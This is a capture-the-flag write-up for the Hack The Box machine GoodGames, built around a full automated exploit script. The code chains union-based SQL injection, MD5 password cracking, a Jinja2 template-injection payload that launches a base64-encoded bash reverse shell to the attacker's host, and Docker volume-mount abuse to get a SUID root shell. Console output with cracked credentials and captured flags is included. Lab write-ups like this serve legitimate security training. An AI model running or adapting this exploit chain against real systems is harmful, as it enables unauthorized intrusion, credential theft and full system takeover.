# Hack The Box. Machines. GoodGames

Machine write-up: https://7rocky.github.io/en/htb/goodgames

### `autopwn.py`

This is a Python script that automates all the steps needed to compromise the machine. These are the steps:

- Union-based SQL injection
- Pasword hash cracking
- Server-Side Template Injection (SSTI)
- Docker container enumeration
- SSH into the host machine
- Abuse volume mounts
- Reverse shell as `root` using SUID `bash`

All these steps can be followed in the `main` function:

```python
def main():
    if len(sys.argv) != 4:
        log.error(f'Usage: python3 {sys.argv[0]} <wordlist> <lhost> <lport>')

    wordlist = sys.argv[1]
    lhost = sys.argv[2]
    lport = int(sys.argv[3])

    username, hashed_password = exploit_sqli()
    log.success(f'Found hashed password for "{username}": {hashed_password}')

    password = dictionary_attack(hashed_password, wordlist)

    if not password:
        log.error(f'Hashed password could not be cracked: {hashed_password}')

    s = requests.session()
    do_login(s, username, password)

    sh = listen(lport)
    Thread(target=exploit_ssti, args=(s, lhost, lport)).start()
    sh.wait_for_connection()

    host_ip, user, user_txt = container_enum(sh)
    abuse_volume_mounts(sh, host_ip, user, password)

    sh.sendlineafter(b'$ ', f'/home/{user}/bash -p'.encode())
    sh.sendlineafter(b'# ', f'cat /root/root.txt'.encode())
    sh.recvline()
    root_txt = sh.recvline().decode().strip()[-32:]
    log.success(f'user.txt: {user_txt}')
    log.success(f'root.txt: {root_txt}')

    sh.sendlineafter(b'# ', f'alias bash="/home/{user}/bash -p"'.encode())
    log.info(f'Set: alias bash="/home/{user}/bash -p"')

    root_sh = listen(lport + 1)
    Thread(
        target=sh.sendlineafter, args=(b'# ', rev_shell(lhost, lport + 1))
    ).start()
    root_sh.wait_for_connection()
    root_sh.sendlineafter(b'# ', f'rm /home/{user}/bash'.encode())
    root_sh.recvline()
    root_sh.interactive(prompt='')
```

Now I will explain each step of the exploit.

- Union based SQL injection:

```python
def exploit_sqli() -> Tuple[str, str]:
    database = do_sqli('database()')
    log.info(f'Found database: {database}')
    table_names = do_sqli(
        f"group_concat(table_name) from information_schema.tables where table_schema='{database}'")
    table_name = 'user'
    log.info(f'Found tables: {table_names}. Using: {table_name}')
    column_names = do_sqli(
        f"group_concat(column_name) from information_schema.columns where table_name='{table_name}'")
    columns = ('name', 'password')
    log.info(
        f'Found columns: {column_names}. Using: {",".join(columns)}')
    row_value = do_sqli(
        f"concat({columns[0]},0x20,{columns[1]}) from {table_name} limit 1")

    return tuple(row_value.split())
```

As shown in the [write-up](https://7rocky.github.io/en/htb/goodgames), the website is vulnerable to Union-based SQL injection in the fourth column;

```console
$ curl 10.10.11.130/login -sd "email=' union select 111,222,333,444-- -&password=x" | grep -E '111|222|333|444'  
                    <h2 class="h4">Welcome 444</h2>
```

Using this, we can inject SQL queries at the fourth position:

```console
$ curl 10.10.11.130/login -sd "email=' union select 1,2,3,database()-- -&password=x" | grep Welcome  
                    <h2 class="h4">Welcome main</h2>
```

In the Python script, we use Regular Expressions (module `re`) to take only the results of the query:

```python
def do_sqli(query: str) -> str:
    payload = f"' union select 1,2,3,{query}-- -"
    r = requests.post(f'{URL}/login', data={'email': payload, 'password': 'x'})

    return re.findall(r'<h2 class="h4">Welcome (.*?)</h2>', r.text, flags=re.DOTALL)[0]
```

There is a username and a hashed password inside the database.

- Pasword hash cracking:

We know that the hash is MD5, so we can use `hashlib` and `rockyou.txt` as a wordlist to perform a dictionary attack until we find a password whose MD5 hash matches with the one coming from the database:

```python
def dictionary_attack(hashed_password: str, wordlist: str) -> str:
    crack_progress = log.progress('Cracking hash')

    with open(wordlist, 'rb') as f:
        for password in f.read().splitlines():
            try:
                crack_progress.status(password.decode())
                if hashlib.md5(password).hexdigest() == hashed_password:
                    crack_progress.success(password.decode())
                    return password.decode()
            except UnicodeDecodeError:
                pass
```

It takes some times. It would have been better to use rainbow tables (as shown in the [write-up](https://7rocky.github.io/en/htb/goodgames)).

- Server-Side Template Injection (SSTI):

Now we can enter another subdomain (`http://internal-administration.goodgames.htb`) and login as `admin`. For that, we need to take a CSRF token in order to log in successfully:

```python
def do_login(s: requests.Session, username: str, password: str):
    r = s.get(f'{URL}/login', headers={'Host': VHOST})
    csrf_token = re.findall(
        r'<input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)">', r.text)[0]
    log.info(f'Got CSRF token: {csrf_token}')

    s.post(f'{URL}/login',
           headers={'Host': VHOST},
           data={
               'csrf_token': csrf_token,
               'username': username,
               'password': password,
               'login': ''
           })
```

As we are using `request.Session`, the cookie received in the response will be saved for future requests.

Now we have a SSTI vulnerability at the user's profile (here we don't need the CSRF token):

```python
def exploit_ssti(s: requests.Session, lhost: str, lport: int):
    cmd = f'echo {b64e(rev_shell(lhost, lport))} | base64 -d | bash'
    ssti_payload = '{{cycler.__init__.__globals__.os.popen("%s").read()}}' % cmd
    log.info(f'Using SSTI payload: {ssti_payload}')

    s.post(f'{URL}/settings',
           headers={'Host': VHOST},
           data={'name': ssti_payload})
```

We are using a payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2):

```django
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

But instead of `id` we use a reverse shell Bash command to gain access to the server. The reverse shell is encoded in Base64:

```python
def rev_shell(lhost: str, lport: int) -> bytes:
    rev_shell_payload = f'bash  -i >& /dev/tcp/{lhost}/{lport} 0>&1'
    log.info(f'Using reverse shell: {rev_shell_payload}')
    return rev_shell_payload.encode()
```

- Docker container enumeration:

We know that we arrive in a container. Here, we can enumerate a user in `/home` and the IP address (and also get the flag `user.txt`):

```python
def container_enum(sh) -> Tuple[str, str, str]:
    sh.sendlineafter(b'# ', b'ls /home')
    sh.recvline()
    user = sh.recvline().decode().strip()
    log.info(f'Found user: {user}')

    sh.sendlineafter(b'# ', b'hostname -i')
    sh.recvline()
    container_ip = sh.recvline().decode().strip()
    host_ip = '.'.join(container_ip.split('.')[:3] + ['1'])
    log.info(f'Connected to container at: {container_ip}')

    sh.sendlineafter(b'# ', f'cat /home/{user}/user.txt'.encode())
    sh.recvline()
    user_txt = sh.recvline().decode().strip()[-32:]

    return host_ip, user, user_txt
```

- SSH into the host machine:

We know from a previous enumeration that SSH is open at the host machine (which has an IP address ending in `.1`). The scanning process is shown in the [write-up](https://7rocky.github.io/en/htb/goodgames).

In order to access via SSH successfullym we need to greate a pseudo-TTY and export `TERM=xterm` (as usual when using a reverse shell):

```python
sh.sendlineafter(b'# ', f'rm /home/{user}/bash'.encode())
sh.sendlineafter(b'# ', f'script /dev/null -c bash'.encode())
sh.sendlineafter(b'# ', f'export TERM=xterm'.encode())

sh.sendlineafter(b'# ', f'ssh {user}@{host_ip}'.encode())
sh.sendlineafter(b'password: ', password.encode())
```

- Abuse volume mounts

The previous code snippet is inside a function called `abuse_volume_mounts`:

```python
def abuse_volume_mounts(sh, host_ip: str, user: str, password: str):
    sh.sendlineafter(b'# ', f'rm /home/{user}/bash'.encode())
    sh.sendlineafter(b'# ', f'script /dev/null -c bash'.encode())
    sh.sendlineafter(b'# ', f'export TERM=xterm'.encode())

    sh.sendlineafter(b'# ', f'ssh {user}@{host_ip}'.encode())
    sh.sendlineafter(b'password: ', password.encode())
    log.info(f'SSH to {host_ip} using credentials "{user}:{password}"')

    sh.sendlineafter(b'$ ', f'cp /bin/bash /home/{user}/bash'.encode())
    sh.sendlineafter(b'$ ', b'exit')
    sh.sendlineafter(b'# ', f'chown root:root /home/{user}/bash'.encode())
    sh.sendlineafter(b'# ', f'chmod 4755 /home/{user}/bash'.encode())

    sh.sendlineafter(b'# ', f'ssh {user}@{host_ip}'.encode())
    sh.sendlineafter(b'password: ', password.encode())
```

The Docker container is mounting a volume at `/home/augustus`. The exploitation consists of copying `/bin/bash` into that directory and changing its permissions as `root` from the Docker container.

Finally, we can use `bash -p` to access as `root`:

```python
sh.sendlineafter(b'$ ', f'/home/{user}/bash -p'.encode())
sh.sendlineafter(b'# ', f'cat /root/root.txt'.encode())
sh.recvline()
root_txt = sh.recvline().decode().strip()[-32:]
log.success(f'user.txt: {user_txt}')
log.success(f'root.txt: {root_txt}')
```

- Reverse shell as `root` using SUID `bash`:

Here we could have used `sh.interactive()` but the output is not correctly shown (maybe because of the pseudo-TTY). The workaround is to use a second reverse shell using the SUID `bash` binary (I used an alias to reuse the `rev_shell` function):

```python
sh.sendlineafter(b'# ', f'alias bash="/home/{user}/bash -p"'.encode())
log.info(f'Set: alias bash="/home/{user}/bash -p"')

root_sh = listen(lport + 1)
Thread(
    target=sh.sendlineafter, args=(b'# ', rev_shell(lhost, lport + 1))
).start()
root_sh.wait_for_connection()
root_sh.sendlineafter(b'# ', f'rm /home/{user}/bash'.encode())
root_sh.recvline()
root_sh.interactive(prompt='')
```

We also remove the SUID `bash` binary to cleanup the directory.

Finally, if we run the exploit, we get access as `root`. We need to provide the path to the wordlist, our attacker IP address and port we want to listen on:

```console
$ python3 autopwn.py $WORDLISTS/rockyou.txt 10.10.17.44 4444
[*] Found database: main
[*] Found tables: blog,blog_comments,user. Using: user
[*] Found columns: email,id,name,password. Using: name,password
[+] Found hashed password for "admin": 2b22337f218b2d82dfc3b6f77e7cb8ec
[+] Cracking hash: superadministrator
[*] Got CSRF token: IjJmM2FhN2M5NmQyNzMxMDYwYWUxNGRhODE2YThmNzkxYzY1YTdiZGQi.Yhdd1A.EFHJgaw43_YSRoK4TcJcKW0V098
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.11.130 on port 58366
[*] Using reverse shell: bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1
[*] Using SSTI payload: {{cycler.__init__.__globals__.os.popen("echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash").read()}}
[*] Found user: augustus
[*] Connected to container at: 172.19.0.2
[*] SSH to 172.19.0.1 using credentials "augustus:superadministrator"
[+] user.txt: b26a4127cbfb7a1bcbf8e59b1e864a77
[+] root.txt: c682307c4267caea83431507bad0819c
[*] Set: alias bash="/home/augustus/bash -p"
[*] Using reverse shell: bash  -i >& /dev/tcp/10.10.17.44/4445 0>&1
[+] Trying to bind to :: on port 4445: Done
[+] Waiting for connections on :::4445: Got connection from ::ffff:10.10.11.130 on port 45680
[*] Switching to interactive mode
bash-5.1#
```

**Note:** The previous code snippets are shown only as an explanation, the complete source code is a bit different due to global variables and the imported libraries.
